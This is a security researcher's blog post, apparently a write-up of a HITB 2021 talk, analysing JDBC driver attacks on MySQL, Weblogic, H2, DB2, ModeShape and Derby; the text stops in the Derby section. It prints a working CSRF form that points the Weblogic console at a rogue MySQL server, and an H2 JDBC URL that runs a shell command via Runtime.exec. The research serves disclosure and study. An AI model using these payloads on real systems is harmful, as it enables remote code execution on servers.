@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="0x01 ForewordsDuring our presentation at HITB Singapore 2021, we discussed JDBC attacks. This write-up provides a detailed overview of that talk. 0x02 JDBC IntroductionThe JDBC API is a Java-based int">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Make JDBC Attacks Great Again I">
+<meta property="og:url" content="https://pyn3rd.github.io/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/index.html">
+<meta property="og:site_name">
+<meta property="og:description" content="0x01 ForewordsDuring our presentation at HITB Singapore 2021, we discussed JDBC attacks. This write-up provides a detailed overview of that talk. 0x02 JDBC IntroductionThe JDBC API is a Java-based int">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-131.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-132.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-133.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-135.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-200.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-205.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-202.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-137.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-139.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-140.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-141.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-142.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-143.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-145.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-144.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-146.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-148.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-147.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-161.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-162.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-165.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-156.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-158.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-159.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-160.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-152.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-153.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-203.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-164.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-168.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-169.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-207.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-208.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-209.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-170.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-181.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-172.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-210.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-211.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-212.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-178.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-179.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-180.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-212.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-184.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-185.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-187.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-188.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-189.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-190.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-192.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-193.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-194.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-195.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-196.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-197.png">
+<meta property="og:image" content="https://pyn3rd.github.io/images/pasted-198.png">
+<meta property="article:published_time" content="2022-06-06T09:35:53.000Z">
+<meta property="article:modified_time" content="2024-10-11T08:40:05.171Z">
+<meta property="article:author" content="pyn3rd">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pyn3rd.github.io/images/pasted-131.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Make JDBC Attacks Great Again I</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Archives</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/06/18/Weblogic-SSRF-Involving-Deserialized-JDBC-Connection/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/06/02/Make-JDBC-Attacks-Brilliant-Again/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://pyn3rd.github.io/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://pyn3rd.github.io/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/&text=Make JDBC Attacks Great Again I"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://pyn3rd.github.io/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/&title=Make JDBC Attacks Great Again I"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://pyn3rd.github.io/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/&is_video=false&description=Make JDBC Attacks Great Again I"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Make JDBC Attacks Great Again I&body=Check out this article: https://pyn3rd.github.io/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://pyn3rd.github.io/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/&title=Make JDBC Attacks Great Again I"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://pyn3rd.github.io/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/&title=Make JDBC Attacks Great Again I"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://pyn3rd.github.io/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/&title=Make JDBC Attacks Great Again I"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://pyn3rd.github.io/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/&title=Make JDBC Attacks Great Again I"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://pyn3rd.github.io/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/&name=Make JDBC Attacks Great Again I&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://pyn3rd.github.io/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/&t=Make JDBC Attacks Great Again I"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#0x01-Forewords"><span class="toc-number">1.</span> <span class="toc-text">0x01 Forewords</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#0x02-JDBC-Introduction"><span class="toc-number">2.</span> <span class="toc-text">0x02 JDBC Introduction</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#0x03-Review-Historical-Issues"><span class="toc-number">3.</span> <span class="toc-text">0x03 Review Historical Issues</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#MySQL-Client-Arbitrary-File-Reading-Vulnerability"><span class="toc-number">3.1.</span> <span class="toc-text">MySQL Client Arbitrary File Reading Vulnerability</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#MySQL-JDBC-Client-Deserialization-Vulnerability"><span class="toc-number">3.2.</span> <span class="toc-text">MySQL JDBC Client Deserialization Vulnerability</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Weblogic-RCE-involving-MySQL-JDBC-Deserialization"><span class="toc-number">3.3.</span> <span class="toc-text">Weblogic RCE involving MySQL JDBC Deserialization</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#SpringBoot-H2-Console-RCE-with-JDBC-Driver"><span class="toc-number">3.4.</span> <span class="toc-text">SpringBoot H2 Console RCE with JDBC Driver</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#JBoss-Wildfly-Server-Console-RCE-with-JDBC-Driver"><span class="toc-number">4.</span> <span class="toc-text">JBoss &#x2F;Wildfly Server Console RCE with JDBC Driver</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#IBM-DB2-RCE-with-JDBC-Driver"><span class="toc-number">4.1.</span> <span class="toc-text">IBM DB2 RCE with JDBC Driver</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#ModeShape-RCE-with-JDBC-Driver"><span class="toc-number">4.2.</span> <span class="toc-text">ModeShape RCE with JDBC Driver</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Apache-Derby-with-JDBC-Driver"><span class="toc-number">4.3.</span> <span class="toc-text">Apache Derby with JDBC Driver</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQLite-RCE-with-JDBC-Driver"><span class="toc-number">5.</span> <span class="toc-text">SQLite RCE with JDBC Driver</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Open-Source-Project-JDBC-Attack-Defense-Policy"><span class="toc-number">6.</span> <span class="toc-text">Open Source Project JDBC Attack Defense Policy</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Conclusion"><span class="toc-number">7.</span> <span class="toc-text">Conclusion</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Make JDBC Attacks Great Again I
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">pyn3rd</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-06-06T09:35:53.000Z" itemprop="datePublished">2022-06-06</time>
+        
+        (Updated: <time datetime="2024-10-11T08:40:05.171Z" itemprop="dateModified">2024-10-11</time>)
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h5 id="0x01-Forewords"><a href="#0x01-Forewords" class="headerlink" title="0x01 Forewords"></a>0x01 Forewords</h5><p>During our presentation at HITB Singapore 2021, we discussed JDBC attacks. This write-up provides a detailed overview of that talk.</p>
+<h5 id="0x02-JDBC-Introduction"><a href="#0x02-JDBC-Introduction" class="headerlink" title="0x02 JDBC Introduction"></a>0x02 JDBC Introduction</h5><p>The JDBC API is a Java-based interface designed for accessing various types of tabular data, particularly data stored in relational databases.</p>
+<p>JDBC enables Java applications to perform three key operations:</p>
+<ul>
+<li>Establish a connection to a data source, such as a database.</li>
+<li>Send queries and update statements to the database.</li>
+<li>Retrieve and process the results returned by the database in response to these queries.</li>
+</ul>
+<p>Essentially, JDBC consists of a set of standard interfaces, with each relational database offering its own specific implementation, such as <code>JDBCMysqlImpl</code> for the MySQL JDBC driver. Below is a diagram illustrating these implementations.</p>
+<p><img src="/images/pasted-131.png" alt="upload successful"></p>
+<p>It is mainly in the <code>java.sql</code> package in JDK, JDBC drivers are client-side adapters , installed in the client endpoint, not in the server side. It can convert requests from Java programs to a protocol that the DBMS can understand.JDBC drivers provide JDBC specific implementations for different databases . For developers, JDBC helps shield the specifics of individual databases.</p>
+<p>The following simple code fragment gives an example.</p>
+<p><img src="/images/pasted-132.png" alt="upload successful"></p>
+<p>The short code fragment instantiates a <code>DriverManager</code> object to connect to a database driver and log into the database. It occured to me that if the JDBC URL is under control, what will take place?</p>
+<p>According to the above picture, the basic attack assumptive steps are as follow:</p>
+<ul>
+<li><p>Sets a malicious JDBC URL and triggers the JDBC connection. </p>
+</li>
+<li><p>As the client side, it connects to the malicious server which specified by the attacker with JDBC driver. </p>
+</li>
+<li><p>Take advantage of the security flaws or some particular properties of the JDBC drivers to trigger these vulnerabilities.</p>
+</li>
+</ul>
+<p>Before my new research, I focus on some disclosed cases. So it starts with the in-depth analysis of the historical vulnerablities.</p>
+<h5 id="0x03-Review-Historical-Issues"><a href="#0x03-Review-Historical-Issues" class="headerlink" title="0x03 Review Historical Issues"></a>0x03 Review Historical Issues</h5><h6 id="MySQL-Client-Arbitrary-File-Reading-Vulnerability"><a href="#MySQL-Client-Arbitrary-File-Reading-Vulnerability" class="headerlink" title="MySQL Client Arbitrary File Reading Vulnerability"></a>MySQL Client Arbitrary File Reading Vulnerability</h6><p>This vulnerability is caused by the existed MySQL feature for a long time. The feature is that the <code>Load Data Local Infile</code> statement can read client files and send them to the server. There is no doubt that this feature is very risky. The MySQL official document clearly states that clients should not connect to any untrusted server. </p>
+<p>To tell the truth, is that it’s always hard to make sure. And since this is the specification of MySQL, it can affect most clients, including the MySQL JDBC driver. An attacker can forge a malicious MySQL server and after the client connecting, the client will send some initializing query packets such as sending query to <code>SET NAMES</code> with charset <code>utf-8</code>, then the malicious server can send a file transfer packet specifying to read any file from the client.</p>
+<p><img src="/images/pasted-133.png" alt="upload successful"></p>
+<h6 id="MySQL-JDBC-Client-Deserialization-Vulnerability"><a href="#MySQL-JDBC-Client-Deserialization-Vulnerability" class="headerlink" title="MySQL JDBC Client Deserialization Vulnerability"></a>MySQL JDBC Client Deserialization Vulnerability</h6><p>Actually the MySQL JDBC deserialization vulnerability was firstly mentioned by <code>Thijs Alkemade</code> in 2017. </p>
+<p><img src="/images/pasted-135.png" alt="upload successful"></p>
+<p>This report named <code>Unexpected automatic deserialisation of Java objects</code> was assinged as CVE-2017-3523 eventually. Until 2019, a further research is disclosed by <code>ZhangYang</code> and his team mates. They made a presentation named <code>&lt;New Exploit Technique In Java Deserialization Attack&gt;</code> in Black Hat Europe. When MySQL JDBC directly deserializes certain types of data returned from the server, It can result in a remote code execution if the gadgets are appropriate.</p>
+<p><img src="/images/pasted-200.png" alt="upload successful"></p>
+<p>Using the <code>statementInterceptors</code> property provided by the JDBC driver, you can set an interceptor to perform additional operations before or after the certain kinds of statements. The full attacking chains are as follows</p>
+<ul>
+<li>Firstly, set the <code>statementInterceptor</code> attribute to <code>ServerStatusDiffInterceptor</code>, auditing <code>ServerStatusDiffInterceptor</code> code, you can see that this interceptor allows the client to send specific queries to the server, In addition, the <code>getObject</code> method is used to process the returned column. </li>
+</ul>
+<p><img src="/images/pasted-205.png" alt="upload successful"></p>
+<ul>
+<li>Secondly, in the <code>getObject</code> method, the driver will directly call the <code>readObject</code> method for deserialization of binary and blob types. Therefore, the server side controlled by the attacker can trigger deserialization vulnerabilities as long as it returns falsified serialized data.</li>
+</ul>
+<p><img src="/images/pasted-202.png" alt="upload successful"></p>
+<p>Of course, the class and property names of interceptors are different in various version of JDBC driver as shown in the table.</p>
+<p><img src="/images/pasted-137.png" alt="upload successful"></p>
+<h6 id="Weblogic-RCE-involving-MySQL-JDBC-Deserialization"><a href="#Weblogic-RCE-involving-MySQL-JDBC-Deserialization" class="headerlink" title="Weblogic RCE involving MySQL JDBC Deserialization"></a>Weblogic RCE involving MySQL JDBC Deserialization</h6><p>I look for some real world scenarios of MySQL JDBC connection configuration. I suddenly realize that data source can be specified by user in Weblogic server console and MySQL JDBC driver is built-in.Consequently I can customize the JDBC URL with some particular properties. And then I analyze the Weblogic server source code to make sure that. Unfortunately, it needs the authorization. I hope to make it much more harmful, then I figure out there is no CSRF token check of <code>createJDBCDataSourceForm</code>.</p>
+<p><img src="/images/pasted-139.png" alt="upload successful"></p>
+<p>Eventually, I construct the PoC like this</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form name =&quot;wls&quot; target=&quot;frame&quot; action=&quot;http://weblogic-server-ip:7001/console/console.portal?CreateGlobalJDBCDataSourcePortlet_actionOverride=/com/bea/console/actions/jdbc/datasources/createjdbcdatasource/testConnectionConfiguration&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;CreateGlobalJDBCDataSourcePortletdriverClassName&quot; value=&quot;com.mysql.jdbc.Driver&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;CreateGlobalJDBCDataSourcePortleturl&quot; value=&quot;jdbc:mysql://rogue-mysql-server-ip:3306/demo?user=root&amp;password=password&amp;characterEncoding=utf8&amp;useSSL=false&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;iframe name=&quot;frame&quot; style=&quot;display:none&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;script&gt;document.wls.submit()&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>When the administrator clicks the link of the above HTML page, the remote code will executed. I reported the bugs to Oracle. Then CVE number are assigned as <code>CVE-2020-2869, CVE-2020-2934</code>.</p>
+<p><img src="/images/pasted-140.png" alt="upload successful"></p>
+<h6 id="SpringBoot-H2-Console-RCE-with-JDBC-Driver"><a href="#SpringBoot-H2-Console-RCE-with-JDBC-Driver" class="headerlink" title="SpringBoot H2 Console RCE with JDBC Driver"></a>SpringBoot H2 Console RCE with JDBC Driver</h6><p>When SpringBoot H2 database console is enabled, we can access the endpoit <code>/h2-console/</code> to administrate the H2 database with a web page. </p>
+<p>However,the JDBC URL of H2 database is on supportive of the <code>INIT</code> parameter. It can be utilized to execute an initialization SQL sentence, meanwhile, an external SQL script can be imported by <code>RUNSCRIPT FROM</code>. </p>
+<p><img src="/images/pasted-141.png" alt="upload successful"></p>
+<p>Here is the illustration in SpringBoot H2 console</p>
+<p><img src="/images/pasted-142.png" alt="upload successful"></p>
+<p>First of all, we have to review the source code to figure out why we use the <code>RUNSCRIPT FROM</code> statement.</p>
+<p><img src="/images/pasted-143.png" alt="upload successful"></p>
+<p>During debugging the source code, we know that the <code>INIT</code> property is on supportive of executing any SQL statement, but you have to merge multiple SQL sentences into one. So we naturally choose <code>RUNSCRIPT FROM</code> key word to invoke a remote SQL script.</p>
+<p>Refer to the illustration, there is a disadvantage that a HTTP request is required with <code>RUNSCRIPT FROM</code> key word. Usually establishing a HTTP protocol request to the external network is forbbiden. </p>
+<p>After further testing, I find another way of using <code>\</code> to translate <code>;</code>. multiple sentences are merged into one, that meets all our requirements.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS &#x27;String shellexec(String cmd) throws java.io.IOException &#123;Runtime.getRuntime().exec(cmd)\;return &quot;test&quot;\;&#125;&#x27;\;CALL EXEC(&#x27;open -a calculator&#x27;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/pasted-145.png" alt="upload successful"></p>
+<p>Of course, we can use other sentences. The <code>CREATE ALIAS Function</code> key words are combined with an additional <code>CALL</code> key word in multiple SQL sentences, but they are both necessary in the same time. </p>
+<p>After more in-depth analyses of the source code. We find that the <code>JAVA METHOD</code> defined in <code>CREATE ALIAS AS</code> sentence is all handled by the method  <code>SourceCompiler</code>. It supports three kinds of processing logic, <code>Java</code>, <code>JavaScript</code> and <code>Groovy</code>, all of which are compiled in order to finally execute the <code>ALIAS</code> function. </p>
+<p><img src="/images/pasted-144.png" alt="upload successful"></p>
+<p>The <code>parseClass</code> of Groovy catches my eye and it occurs to me that <code>Orange Tsai</code> made a presentation named <code>&lt;Hacking Jenkins Part 2&gt;</code> in 2019. Is is about abusing meta programming. </p>
+<p>Here is the official introduction about the <code>@asttest</code> annotation.</p>
+<p><img src="/images/pasted-146.png" alt="upload successful"></p>
+<p>It is triggered by <code>parseClass</code> method.</p>
+<p><img src="/images/pasted-148.png" alt="upload successful"></p>
+<p>Finally we can execute malicious java code in assertions.</p>
+<p><img src="/images/pasted-147.png" alt="upload successful"></p>
+<p>However, in the real world, Groovy dependencies are not built into H2 database environment. So this attack depends on whether Groovy components are included into the application. Obviously it does not make sense.</p>
+<p>So we continue to look for another way to attack, reviewing the source code, we quickly discover that in addition to the <code>CREATE ALIAS AS</code>  sentence, there is another sentence can input a customized source code. In the parsing of the <code>CREATE Trigger</code> statement, finally, we can call <code>loadFromSource</code> method of the <code>TriggerObject</code> class. We are pleasantly surprised to find that in this method, the javascript source code is not only compiled but also executed. As the source code showing, it calls the <code>eval()</code> method directly. And since <code>ScriptEngine</code> is finally used for execution with no sandbox implement, we could input any java class fragment we wanted in javascript. So with this, we can easily achieve the purpose of RCE without the <code>CALL</code> or other sentences.</p>
+<p><img src="/images/pasted-161.png" alt="upload successful"></p>
+<p>As the PoC shows,JavaScript scripts start with JavaScript comments, and then we can then simply use <code>java.lang.Runtime.getRuntime().exec()</code> method to achieve RCE.</p>
+<p><img src="/images/pasted-162.png" alt="upload successful"></p>
+<h5 id="JBoss-Wildfly-Server-Console-RCE-with-JDBC-Driver"><a href="#JBoss-Wildfly-Server-Console-RCE-with-JDBC-Driver" class="headerlink" title="JBoss /Wildfly Server Console RCE with JDBC Driver"></a>JBoss /Wildfly Server Console RCE with JDBC Driver</h5><p>Here is another sample we use H2 database JDBC driver to execute remote  malicious code, you can refer to the <code>SpringBoot H2 RCE</code> sample.</p>
+<p><img src="/images/pasted-165.png" alt="upload successful"></p>
+<h6 id="IBM-DB2-RCE-with-JDBC-Driver"><a href="#IBM-DB2-RCE-with-JDBC-Driver" class="headerlink" title="IBM DB2 RCE with JDBC Driver"></a>IBM DB2 RCE with JDBC Driver</h6><p>After the above research, I realize some properties of JDBC driver could directly lead to vulnerablities.</p>
+<p>I read the official documents of IBM DB2 JDBC driver to search the potential suspicious properties. I noticed a property called <code>clientRerouteServerListJNDIName</code>, the official description as follows</p>
+<p><img src="/images/pasted-156.png" alt="upload successful"></p>
+<p>As described in the document, if the first connection to the data source fails, this property will provide an alternative server location.The <code>Lookup</code> method of the context is finally called for performing a JNDI lookup according to the source code fragment.</p>
+<p><img src="/images/pasted-158.png" alt="upload successful"></p>
+<p>So it is easy to imagine that if a malicious JNDI location is provided and the client fails to the connect the first location, then it will look up the second malicious JNDI location. Obviously, it is a well-known JNDI injection vulnerability.</p>
+<p><img src="/images/pasted-159.png" alt="upload successful"></p>
+<p>When the client connects to the malicious LDAP server, it will load the malicious java class from the remote codebase.Here is the final PoC</p>
+<p><img src="/images/pasted-160.png" alt="upload successful"></p>
+<h6 id="ModeShape-RCE-with-JDBC-Driver"><a href="#ModeShape-RCE-with-JDBC-Driver" class="headerlink" title="ModeShape RCE with JDBC Driver"></a>ModeShape RCE with JDBC Driver</h6><p><code>ModeShape</code> is a lightweight, fast, and pluggable JCR repository that federates and unifies content from multiple systems, including files systems, databases, configuration files, other repositories, services, applications, and data grids. </p>
+<p><img src="/images/pasted-152.png" alt="upload successful"></p>
+<p>The full name of JCR is Content Repository API for Java is a specification for a Java platform application programming interface API to access content repositories in a uniform manner. Using the JCR API, you can get data from a variety of different systems, including file systems, relational databases and so on.</p>
+<p><img src="/images/pasted-153.png" alt="upload successful"></p>
+<p>A standard JCR connection for ModeShape is in the format shown bellow, which requires <code>repositoryName</code> to make a connection to an existing repository. In this way, the JNDI string in the connection URL gets our attention, and we reasonably assume that in addition to supporting the JCR protocol, other protocols such as LDAP should also be supported. </p>
+<p><img src="/images/pasted-203.png" alt="upload successful"></p>
+<p>After futher testing, it turns out that we can indeed initiate a JNDI lookup request to a specified LDAP server, so this is another typical JNDI injection vulnerability.</p>
+<p><img src="/images/pasted-164.png" alt="upload successful"></p>
+<h6 id="Apache-Derby-with-JDBC-Driver"><a href="#Apache-Derby-with-JDBC-Driver" class="headerlink" title="Apache Derby with JDBC Driver"></a>Apache Derby with JDBC Driver</h6><p>Apache Derby is an open source relational database implemented entirely in java. It can be used as an embedded database just like H2 database. With embedded databases, it is usually easier to implement attacks because the server and client can exist in the same project. </p>
+<p>We find a suspicious java code fragment when we look for sensitive calls in the Apache Derby driver code.There is a <code>readMessage</code> method in the <code>SocketConnection</code> class. The <code>readObject</code> method is invoked directly, which is always used to deserialize input stream in java. This code fragment obviously exists a deserialization vulnerability. In fact, from a security code point of view, this <code>SocketConnection</code> class is suspicious. </p>
+<p><img src="/images/pasted-168.png" alt="upload successful"></p>
+<p>You can see from its construct method, it wraps a socket and wraps  socket <code>Outputstream</code> and <code>Inputstream</code> into object <code>OutputStream</code> and <code>ObjectInputStream</code>.</p>
+<p>The <code>readMessage</code> method seems to read and parse the socket <code>Inputstream</code>. If we can communicate with the wrapped socket, then we will probably be able to trigger the deserialization vulnerability. So we go back to the invocation chains and see how to call the <code>readMessage</code> method.We find that the caller is the inner class <code>MasterReceiverThread</code> of <code>ReplicationMessageTransmit</code> class.</p>
+<p><img src="/images/pasted-169.png" alt="upload successful"></p>
